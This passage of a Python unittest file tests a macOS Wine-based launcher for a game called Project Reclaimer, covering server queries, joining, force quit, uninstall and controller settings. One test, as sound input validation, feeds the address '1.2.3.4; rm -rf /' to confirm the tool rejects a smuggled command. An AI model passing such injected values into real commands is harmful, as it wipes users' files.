        self.assertEqual(out, ["0.9.11 Evil 0.9.1 Fake"])

    def test_server_version_of_a_server_that_doesnt_answer(self):
        self.fake_wine('echo "Error: Connecting to game server (UDP/QUIC): no response within 2500 ms"; exit 1')
        self.assertEqual(self.run_tool("server-version", "1.2.3.4:5")[1][-1], "unreachable")

    def test_server_version_rejects_odd_addresses(self):
        self.assertTrue(self.run_tool("server-version", "1.2.3.4; rm -rf /")[1][-1].startswith("error: "))

    def joined_with(self):
        record = self.tmp / "joined"
        for _ in range(50):
            if record.exists():
                return record.read_text().strip()
            time.sleep(0.1)
        return ""

    def test_join_hands_just_the_link_to_the_running_game(self):
        self.fake_wine(f'echo "$(pwd) $@" > {self.tmp / "joined"}')
        self.assertEqual(self.run_tool("join", "75.98.127.226:49241")[1][-1], "ok")
        # (the game ignores a link given together with other arguments)
        self.assertEqual(self.joined_with(),
                         f"{(self.home / 'game').resolve()} project-reclaimer-v0.9.13.exe reclaimer://join?server=75.98.127.226:49241")

    def test_join_uses_the_chosen_older_version(self):
        self.fake_wine(f'echo "$(pwd) $@" > {self.tmp / "joined"}')
        (self.home / "game" / "versions").mkdir()
        (self.home / "game" / "versions" / "project-reclaimer-v0.9.11.exe").write_bytes(b"MZ")
        (self.home / "game" / "chosen-version").write_text("0.9.11\n")
        self.run_tool("join", "1.2.3.4:5")
        self.assertEqual(self.joined_with(),
                         f"{(self.home / 'game' / 'versions').resolve()} project-reclaimer-v0.9.11.exe reclaimer://join?server=1.2.3.4:5")

    # ---- force quit / uninstall --------------------------------------------------------------------------------
    def test_force_quit_stops_the_game(self):
        game = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)",
                                 "project-reclaimer-v9.9.99.exe game-client"])
        try:
            rc, out = self.run_tool("force-quit")
            self.assertEqual(out[-1], "ok")
            game.wait(timeout=10)
        finally:
            if game.poll() is None:
                game.kill()
        self.assertIsNotNone(game.poll())

    def test_force_quit_works_when_wineserver_hangs(self):
        # a frozen game often means a stuck wineserver: Force Quit must still stop the game, and not hang
        ws = self.home / "wine/Wine Staging.app/Contents/Resources/wine/bin/wineserver"
        ws.parent.mkdir(parents=True)
        ws.write_text("#!/bin/sh\nsleep 120\n")
        ws.chmod(0o755)
        game = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)",
                                 "project-reclaimer-v9.9.99.exe game-client"])
        try:
            rc, out = self.run_tool("force-quit")
            self.assertEqual(out[-1], "ok", out)
            game.wait(timeout=5)
        finally:
            if game.poll() is None:
                game.kill()
            subprocess.run(["pkill", "-f", str(ws)])

    def test_uninstall_without_the_network_task_asks_for_no_password(self):
        self.daemon.unlink()
        rc, out = self.run_tool("uninstall")
        self.assertEqual(out[-1], "ok")
        self.assertFalse([l for l in out if l.startswith("dry-run admin: ")])

    def test_uninstall_says_so_when_the_password_box_was_cancelled(self):
        rc, out = self.run_tool("uninstall", RECLAIMER_TOOLS_DRYRUN="cancel")
        self.assertEqual(out[-1], "ok network-kept")
        self.assertFalse(self.home.exists())

    def test_uninstall_also_removes_the_old_metal_app(self):
        (self.apps / "Project Reclaimer Metal.app").mkdir()
        self.run_tool("uninstall")
        self.assertFalse((self.apps / "Project Reclaimer Metal.app").exists())

    def test_uninstall_removes_app_and_install_and_asks_once_for_the_network_task(self):
        rc, out = self.run_tool("uninstall")
        self.assertEqual(out[-1], "ok", out)
        self.assertFalse(self.home.exists())
        self.assertFalse((self.apps / "Project Reclaimer.app").exists())
        admin = [l for l in out if l.startswith("dry-run admin: ")]
        self.assertEqual(len(admin), 1)
        self.assertIn("launchctl bootout system/local.projectreclaimer.loopback", admin[0])

    def test_uninstall_removes_every_game(self):
        for halo3 in (True, False):  # (also once Halo 3 was removed in Tools and only ODST is left)
            with self.subTest(halo3=halo3):
                self.setUp()
                mcc = self.fake_mcc(halo3=halo3)
                self.assertEqual(self.run_tool("uninstall")[1][-1], "ok")
                self.assertFalse((mcc / "halo3").exists())
                self.assertFalse((mcc / "halo3odst").exists())
                self.assertFalse(self.home.exists())
                self.tearDown()
        self.setUp()  # (for the tearDown that follows)

    def test_uninstall_only_stops_this_installs_helpers(self):
        # e.g. another install's QR sign-in: the reviewer's test run once killed a live sign-in this way
        other = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)",
                                  "/elsewhere/game/workshop_helper.py", "login-qr"])
        try:
            self.run_tool("uninstall")
            self.assertIsNone(other.poll(), "uninstall stopped another install's helper")
        finally:
            other.kill()

    def test_uninstall_removes_the_app_the_player_opened(self):
        moved = self.tmp / "Elsewhere" / "Project Reclaimer.app"
        moved.mkdir(parents=True)
        self.run_tool("uninstall", RECLAIMER_APP_PATH=str(moved))
        self.assertFalse(moved.exists())

    def test_uninstall_refuses_a_home_that_isnt_an_install(self):
        rc, out = self.run_tool("uninstall", RECLAIMER_HOME=str(self.tmp))
        self.assertTrue(out[-1].startswith("error: "))
        self.assertTrue(self.tmp.exists())

    def test_game_env_sets_sdl_controller_config_file_when_mappings_exist(self):
        spec = importlib.util.spec_from_file_location("tools", str(self.home / "game" / "tools.py"))
        tools = importlib.util.module_from_spec(spec)
        with mock.patch.dict(os.environ, {"RECLAIMER_HOME": str(self.home)}):
            spec.loader.exec_module(tools)
            (tools.GAME / "gamecontrollerdb.txt").write_text("guid,bundled,platform:Mac OS X,\n")
            (tools.BASE / "controller-mappings.txt").write_text("guid,user,platform:Mac OS X,\n")
            env = tools.game_env()
            self.assertEqual(env.get("SDL_GAMECONTROLLERCONFIG_FILE"), str(tools.BASE / "controller-mappings-active.txt"))
            self.assertIn("guid,user", (tools.BASE / "controller-mappings-active.txt").read_text())

    def test_game_env_leaves_sdl_controller_config_file_unset_when_no_mappings(self):
        spec = importlib.util.spec_from_file_location("tools", str(self.home / "game" / "tools.py"))
        tools = importlib.util.module_from_spec(spec)
        with mock.patch.dict(os.environ, {"RECLAIMER_HOME": str(self.home)}):
            spec.loader.exec_module(tools)
            (tools.GAME / "gamecontrollerdb.txt").unlink(missing_ok=True)
            (tools.BASE / "controller-mappings.txt").unlink(missing_ok=True)
            (tools.BASE / "controller-mappings-active.txt").unlink(missing_ok=True)
            env = tools.game_env()
            self.assertNotIn("SDL_GAMECONTROLLERCONFIG_FILE", env)


if __name__ == "__main__":
    unittest.main()
